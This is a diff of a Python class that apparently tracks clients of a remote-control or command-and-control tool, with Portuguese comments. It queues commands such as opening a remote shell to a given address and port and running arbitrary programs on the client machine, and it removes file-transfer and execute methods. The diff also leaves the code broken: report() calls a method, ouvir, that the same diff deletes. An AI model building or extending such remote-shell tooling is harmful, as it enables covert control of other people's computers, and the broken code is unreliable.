@@ -7,13 +7,13 @@ class client:
         self.cmd=None
         self.lastcmd=[]
         self.file=None
-        self.result=""
         self.cvcmd = threading.Condition()
         self.cvfile = threading.Condition()
         self.setOK = True;
 
     def report(self,result):
-        self.result=result
+        print("Chegou o result: " + result)
+        return self.ouvir(result)
 
     def getCmd(self):
         self.cvcmd.acquire()
@@ -57,40 +57,25 @@ class client:
 
     def openShell(self,addr,port):
         self.setCmd(["openShell",addr,port])
-        
-    def sendFile(self,fname):
-        print("setado: " + str(["sendfile",fname]))
-        self.setCmd(["sendfile",fname])
-
-    def writefile(self,fname):
-        self.setCmd(["writefile",fname])
-        self.setFile(fname)
-    
-    def executeProgram(self,fname):
-        self.setCmd(["execute",fname])
     
     def runCommand(self,args):
         self.setCmd(["run"]+args)
 
     def clientOK(self):
         self.setCmd(["isOK"])
-        return self.ouvir()
-
-    def ouvir(self):
-        #enviar comando para falar
         time.sleep(1)# mudar para 5 quando terminar
         if (self.setOK):
-            return "Client don't ok"
+            return "Client don't conected"
         else:
             self.setOK=True;
-            return "Client ok"
+            return "Client ok!"
 
 
     def __eq__(self,other):
         return self.uid==other.uid
 
     def __str__(self):
-        return f"uid: {self.uid} ip:{self.ip} activeCmd: {self.cmd} lastcmd: {self.lastcmd} lastreport: {self.result}"
+        return f"uid: {self.uid} ip:{self.ip} activeCmd: {self.cmd} lastcmd: {self.lastcmd}"
         
     def __repr__(self):
         return self.__str__()        
